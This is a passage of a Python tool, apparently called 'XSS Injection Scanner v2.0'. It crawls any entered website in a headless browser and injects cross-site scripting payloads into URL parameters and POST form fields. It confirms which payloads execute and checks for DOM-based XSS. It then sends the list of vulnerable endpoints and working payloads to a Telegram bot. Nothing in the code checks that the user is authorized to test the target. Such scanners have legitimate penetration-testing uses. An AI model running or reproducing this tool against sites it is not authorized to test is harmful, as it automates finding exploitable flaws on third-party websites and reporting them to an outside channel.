                        f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']} on {COLORS['MAGENTA']}{param_key}{COLORS['RESET']}",
                        end=" ", flush=True)
                    test_response = self.get_response_fast(test_url, method='GET', context=context)
                    if not test_response:
                        print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                        continue
                    self.total_tests += 1
                    is_vulnerable, reason = self.analyze_response(original_response, test_response, payload)
                    if is_vulnerable and test_url not in self.detected_vulnerabilities:
                        verify_key = f"{base_url}|{param_key}"
                        if self.failed_verification.get(verify_key, 0) >= 3:
                            print(f"{COLORS['GRAY']}⏭ Skipping verify (param already failed 3x){COLORS['RESET']}")
                            continue
                        print(f"{COLORS['YELLOW']}⚠ Candidate! Verifying...{COLORS['RESET']}", end=" ", flush=True)
                        confirmed, dialog_msg = self.confirm_execution(test_url, payload, context, method="GET")
                        if confirmed:
                            self.vulnerable_tests += 1
                            self.detected_vulnerabilities.add(test_url)
                            print(f"{COLORS['RED']}✓ CONFIRMED XSS!{COLORS['RESET']}")
                            print(f"{COLORS['DIM']}      → {reason} | Dialog: {dialog_msg}{COLORS['RESET']}")
                            vuln_data = {
                                'url': test_url,
                                'payload': payload,
                                'payload_name': payload_name,
                                'parameter': param_key,
                                'reason': f"{reason} | Confirmed: {dialog_msg}",
                            }
                            self.record_vulnerability(vuln_data, scan_type, confirmed=True)
                        else:
                            self.failed_verification[verify_key] = self.failed_verification.get(verify_key, 0) + 1
                            print(f"{COLORS['YELLOW']}✗ Not confirmed{COLORS['RESET']}")
                    else:
                        print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Checking DOM-based XSS...{COLORS['RESET']}")
        for param_data in self.all_get_params[:5]:
            if self.is_time_up():
                return
            dom_findings = self.check_dom_xss(context, param_data['url'])
            for f in dom_findings:
                if f['url'] not in self.detected_vulnerabilities:
                    self.vulnerable_tests += 1
                    self.detected_vulnerabilities.add(f['url'])
                    self.record_vulnerability(f, scan_type, confirmed=True)
                    print(f"{COLORS['RED']}   ✓ DOM XSS: {f['url'][:60]}{COLORS['RESET']}")

    def test_forms_fast(self, context, is_deep=False):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Testing forms for XSS...{COLORS['RESET']}\n")
        forms_to_test = [f for f in self.all_forms if f['method'] == 'POST']
        if is_deep:
            forms_to_test = forms_to_test[:20]
        else:
            forms_to_test = forms_to_test[:10]
        scan_type = "deep" if is_deep else "quick"
        for form_data in forms_to_test:
            if self.is_time_up():
                print(f"\n{COLORS['RED']}⏱ Time limit reached. Stopping form tests.{COLORS['RESET']}")
                return
            url = form_data['url']
            inputs = form_data['inputs']
            endpoint_key = self.get_endpoint_key(url)
            if endpoint_key in self.tested_endpoints:
                print(f"{COLORS['DIM']}   ⏭ Skipping already tested form: {url[:60]}{COLORS['RESET']}")
                continue
            if not inputs:
                continue
            self.tested_endpoints.add(endpoint_key)
            test_data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    name_lower = name.lower()
                    if 'email' in name_lower or 'mail' in name_lower:
                        test_data[name] = 'test@example.com'
                    elif 'password' in name_lower or 'pass' in name_lower:
                        test_data[name] = 'testpass123'
                    elif 'search' in name_lower or 'q' in name_lower:
                        test_data[name] = 'test'
                    else:
                        test_data[name] = 'test_input'
            if not test_data:
                continue
            original_data = urllib.parse.urlencode(test_data)
            original_response = self.get_response_fast(url, original_data, 'POST', context)
            if not original_response:
                continue
            print(f"\n{COLORS['BLUE']}━━━ Testing Form: {url[:60]}{COLORS['RESET']}")
            if is_deep:
                payloads_to_test = CRITICAL_XSS_PAYLOADS
                for input_key in test_data.keys():
                    for payload, payload_name in payloads_to_test:
                        if self.is_time_up():
                            print(f"\n{COLORS['RED']}⏱ Time limit reached. Stopping.{COLORS['RESET']}")
                            return
                        modified_data = test_data.copy()
                        modified_data[input_key] = f"{test_data[input_key]}{payload}"
                        test_data_str = urllib.parse.urlencode(modified_data)
                        print(
                            f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']} on {COLORS['MAGENTA']}{input_key}{COLORS['RESET']}",
                            end=" ", flush=True)
                        test_response = self.get_response_fast(url, test_data_str, 'POST', context)
                        if not test_response:
                            print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                            continue
                        self.total_tests += 1
                        is_vulnerable, reason = self.analyze_response(original_response, test_response, payload)
                        if is_vulnerable and url not in self.detected_vulnerabilities:
                            verify_key = f"{url}|{input_key}"
                            if self.failed_verification.get(verify_key, 0) >= 3:
                                print(f"{COLORS['GRAY']}⏭ Skipping verify (field failed 3x){COLORS['RESET']}")
                                continue
                            print(f"{COLORS['YELLOW']}⚠ Candidate! Verifying...{COLORS['RESET']}", end=" ",
                                  flush=True)
                            confirmed, dialog_msg = self.confirm_execution(url, payload, context, method="POST",
                                                                           data=test_data_str)
                            if confirmed:
                                self.vulnerable_tests += 1
                                self.detected_vulnerabilities.add(url)
                                print(f"{COLORS['RED']}✓ CONFIRMED XSS!{COLORS['RESET']}")
                                print(f"{COLORS['DIM']}      → {reason} | Dialog: {dialog_msg}{COLORS['RESET']}")
                                vuln_data = {
                                    'url': url,
                                    'payload': payload,
                                    'payload_name': payload_name,
                                    'parameter': input_key,
                                    'reason': f"{reason} | Confirmed: {dialog_msg}",
                                }
                                self.record_vulnerability(vuln_data, scan_type, confirmed=True)
                            else:
                                self.failed_verification[verify_key] = self.failed_verification.get(verify_key, 0) + 1
                                print(f"{COLORS['YELLOW']}✗ Not confirmed{COLORS['RESET']}")
                        else:
                            print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")
            else:
                payloads_to_test = CRITICAL_XSS_PAYLOADS[:8]
                for payload, payload_name in payloads_to_test:
                    if self.is_time_up():
                        print(f"\n{COLORS['RED']}⏱ Time limit reached. Stopping.{COLORS['RESET']}")
                        return
                    modified_data = test_data.copy()
                    first_key = list(test_data.keys())[0]
                    modified_data[first_key] = f"{test_data[first_key]}{payload}"
                    test_data_str = urllib.parse.urlencode(modified_data)
                    print(
                        f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']}",
                        end=" ", flush=True)
                    test_response = self.get_response_fast(url, test_data_str, 'POST', context)
                    if not test_response:
                        print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                        continue
                    self.total_tests += 1
                    is_vulnerable, reason = self.analyze_response(original_response, test_response, payload)
                    if is_vulnerable and url not in self.detected_vulnerabilities:
                        verify_key = f"{url}|{first_key}"
                        if self.failed_verification.get(verify_key, 0) >= 3:
                            print(f"{COLORS['GRAY']}⏭ Skipping verify (field failed 3x){COLORS['RESET']}")
                            continue
                        print(f"{COLORS['YELLOW']}⚠ Candidate! Verifying...{COLORS['RESET']}", end=" ",
                              flush=True)
                        confirmed, dialog_msg = self.confirm_execution(url, payload, context, method="POST",
                                                                       data=test_data_str)
                        if confirmed:
                            self.vulnerable_tests += 1
                            self.detected_vulnerabilities.add(url)
                            print(f"{COLORS['RED']}✓ CONFIRMED XSS!{COLORS['RESET']}")
                            print(f"{COLORS['DIM']}      → {reason} | Dialog: {dialog_msg}{COLORS['RESET']}")
                            vuln_data = {
                                'url': url,
                                'payload': payload,
                                'payload_name': payload_name,
                                'parameter': first_key,
                                'reason': f"{reason} | Confirmed: {dialog_msg}",
                            }
                            self.record_vulnerability(vuln_data, scan_type, confirmed=True)
                        else:
                            self.failed_verification[verify_key] = self.failed_verification.get(verify_key, 0) + 1
                            print(f"{COLORS['YELLOW']}✗ Not confirmed{COLORS['RESET']}")
                    else:
                        print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")

    def print_results(self):
        print(f"\n{COLORS['CYAN']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['BOLD']}📊 SCAN COMPLETED{COLORS['RESET']}                                                    {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}                                                                         {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}📄 Pages Discovered:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.discovered_urls)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}🔗 GET Parameters:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.all_get_params)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}📝 Forms Found:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.all_forms)}{COLORS['RESET']}                                                    {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}📜 JS Files Scanned:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.js_files_visited)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}🧪 Tests Performed:{COLORS['RESET']} {COLORS['YELLOW']}{self.total_tests}{COLORS['RESET']}                                                {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}⚠ Vulnerabilities:{COLORS['RESET']} {COLORS['RED']}{self.vulnerable_tests}{COLORS['RESET']}                                                   {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}✅ Confirmed:{COLORS['RESET']} {COLORS['GREEN']}{len(self.confirmed_vulns)}{COLORS['RESET']}                                                       {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}                                                                         {COLORS['CYAN']}║{COLORS['RESET']}")
        if self.vulnerable_found:
            print(
                f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['RED']}⚠ {COLORS['BOLD']}VULNERABLE ENDPOINTS:{COLORS['RESET']}                                          {COLORS['CYAN']}║{COLORS['RESET']}")
            for idx, vuln in enumerate(self.vulnerable_found[:5], 1):
                tag = f"{COLORS['GREEN']}[C]{COLORS['RESET']}" if vuln.get('confirmed') else f"{COLORS['YELLOW']}[S]{COLORS['RESET']}"
                print(
                    f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['RED']}{idx}.{COLORS['RESET']}{tag} {COLORS['YELLOW']}{vuln['url'][:50]}{'...' if len(vuln['url']) > 50 else ''}{COLORS['RESET']}        {COLORS['CYAN']}║{COLORS['RESET']}")
                print(
                    f"{COLORS['CYAN']}║{COLORS['RESET']}      {COLORS['DIM']}Payload:{COLORS['RESET']} {COLORS['MAGENTA']}{vuln['payload'][:35]}{'...' if len(vuln['payload']) > 35 else ''}{COLORS['RESET']}                     {COLORS['CYAN']}║{COLORS['RESET']}")
        else:
            print(
                f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['GREEN']}✓ No XSS Vulnerabilities Found{COLORS['RESET']}                                   {COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")

    def send_to_telegram(self, message):
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            print(f"{COLORS['YELLOW']}⚠ Telegram credentials not set. Skipping send.{COLORS['RESET']}")
            return False
        try:
            import urllib.request
            import json as json_lib
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            max_len = 4000
            chunks = [message[i:i + max_len] for i in range(0, len(message), max_len)]
            for chunk in chunks:
                payload = json_lib.dumps({
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": chunk,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }).encode('utf-8')
                req = urllib.request.Request(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                with urllib.request.urlopen(req, timeout=15) as resp:
                    if resp.status != 200:
                        print(f"{COLORS['RED']}✗ Telegram send failed (HTTP {resp.status}){COLORS['RESET']}")
                        return False
            print(f"{COLORS['GREEN']}✓ Results sent to Telegram successfully{COLORS['RESET']}")
            return True
        except Exception as e:
            print(f"{COLORS['RED']}✗ Telegram error: {e}{COLORS['RESET']}")
            return False

    def format_telegram_report(self, target_url, scan_type):
        from datetime import datetime
        scan_label = "DEEP SCAN" if scan_type == "deep" else "QUICK SCAN"
        status = "🔴 VULNERABLE" if self.vulnerable_found else "🟢 CLEAN"
        lines = []
        lines.append(f"<b>🛡️ XSS SCAN REPORT</b>")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"<b>Target:</b> <code>{self.escape_html(target_url)}</code>")
        lines.append(f"<b>Mode:</b> {scan_label}")
        lines.append(f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"<b>Status:</b> {status}")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"<b>📊 Statistics</b>")
        lines.append(f"• Pages Discovered: <b>{len(self.discovered_urls)}</b>")
        lines.append(f"• GET Parameters: <b>{len(self.all_get_params)}</b>")
        lines.append(f"• Forms Found: <b>{len(self.all_forms)}</b>")
        lines.append(f"• JS Files Scanned: <b>{len(self.js_files_visited)}</b>")
        lines.append(f"• Tests Performed: <b>{self.total_tests}</b>")
        lines.append(f"• Vulnerabilities: <b>{self.vulnerable_tests}</b>")
        lines.append(f"• Confirmed: <b>{len(self.confirmed_vulns)}</b>")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        if self.vulnerable_found:
            lines.append(f"<b>⚠️ VULNERABLE ENDPOINTS ({len(self.vulnerable_found)}):</b>\n")
            for idx, vuln in enumerate(self.vulnerable_found, 1):
                tag = "✅" if vuln.get('confirmed') else "⚠️"
                lines.append(f"<b>{idx}. {tag} Endpoint:</b>")
                lines.append(f"<code>{self.escape_html(vuln['url'])}</code>")
                if 'parameter' in vuln and vuln['parameter']:
                    lines.append(f"<b>Param:</b> <code>{self.escape_html(vuln['parameter'])}</code>")
                lines.append(f"<b>Payload:</b> <code>{self.escape_html(vuln['payload'])}</code>")
                lines.append(f"<b>Type:</b> {self.escape_html(vuln.get('payload_name', 'N/A'))}")
                lines.append(f"<b>Reason:</b> {self.escape_html(vuln['reason'])}")
                lines.append("")
        else:
            lines.append("<b>✅ No XSS vulnerabilities detected.</b>")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"<i>Generated by XSS Injection Scanner v2.0</i>")
        lines.append(f"<a href=\"https://github.com/nn0z/\"><b>- Github</b></a>")
        lines.append(f"<a href=\"https://www.instagram.com/e1z/\"><b>- Instagram</b></a>")
        return "\n".join(lines)

    def run_scan(self, target_url, scan_type="quick"):
        self.base_url = target_url
        self.tested_endpoints = set()
        self.scan_start_time = time.time()
        is_deep = scan_type == "deep"
        if is_deep:
            self.max_pages = 100
            print(
                f"\n{COLORS['YELLOW']}⚠ {COLORS['BOLD']}Deep Scan Mode Enabled{COLORS['RESET']}")
            print(f"{COLORS['YELLOW']}⚠ {COLORS['BOLD']}Advanced discovery + all payloads enabled {COLORS['RESET']}")
            print(f"{COLORS['YELLOW']}⚠ {COLORS['BOLD']}Max scan time: {self.max_scan_seconds}s{COLORS['RESET']}")
        print(f"\n{COLORS['CYAN']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['BOLD']}🔍 Starting XSS Injection Scan   {COLORS['RESET']}                            {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['DIM']}   Target: {target_url[:50]}{'...' if len(target_url) > 50 else ''}{COLORS['RESET']}{' ' * (45 - len(target_url[:50]))}{COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")
        with sync_playwright() as p:
            print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} Initializing browser...")
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                ignore_https_errors=True,
            )
            page = context.new_page()
            print(f"{COLORS['CYAN']}►{COLORS['RESET']} Loading target: {COLORS['YELLOW']}{target_url}{COLORS['RESET']}")
            try:
                page.goto(target_url, timeout=20000)
                page.wait_for_load_state("domcontentloaded", timeout=5000)
            except Exception:
                print(f"{COLORS['YELLOW']}⚠ Quick load{COLORS['RESET']}")
            self.discover_pages_fast(page, deep=is_deep)

            if is_deep:
                self.advanced_discovery(page, context)
                self.crawl_pages_fast(context)
                self.advanced_discovery(page, context)
            else:
                print(f"\n{COLORS['GRAY']}   ↳ Quick Scan: testing provided URL only (no crawling){COLORS['RESET']}")

            self.test_forms_fast(context, is_deep)
            self.test_critical_payloads(context, is_deep)
            self.print_results()
            browser.close()
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} Sending final report to Telegram...")
        report = self.format_telegram_report(target_url, scan_type)
        self.send_to_telegram(report)
        return self.vulnerable_found

    def main(self):
        self.print_banner()
        while True:
            self.print_menu()
            print()
            choice = input(
                f"{COLORS['BOLD']}└──> {COLORS['RESET']}{COLORS['GREEN']}Select option :{COLORS['RESET']}").strip()
            if choice == "3":
                print(f"\n{COLORS['YELLOW']}⚠ Exiting...{COLORS['RESET']}")
                sys.exit(0)
            url = input(
                f"{COLORS['BOLD']}└──> {COLORS['RESET']}{COLORS['CYAN']}Enter target URL : {COLORS['RESET']}").strip()
            if not url.startswith("http"):
                url = "https://" + url
            if choice == "1":
                self.run_scan(url, "quick")
                print(f"\n{COLORS['DIM']}Press Enter to continue...{COLORS['RESET']}")
                try:
                    input()
                except KeyboardInterrupt:
                    print(f"\n{COLORS['YELLOW']}⚠ Exiting...{COLORS['RESET']}")
                    sys.exit(0)
            elif choice == "2":
                self.run_scan(url, "deep")
                print(f"\n{COLORS['GREEN']}✓ Deep scan completed. Exiting automatically...{COLORS['RESET']}")
                sys.exit(0)
            else:
                print(f"{COLORS['RED']}✗ Invalid option!{COLORS['RESET']}")
                continue


if __name__ == "__main__":
    crawler = XSSInjectionCrawler()
    crawler.main()
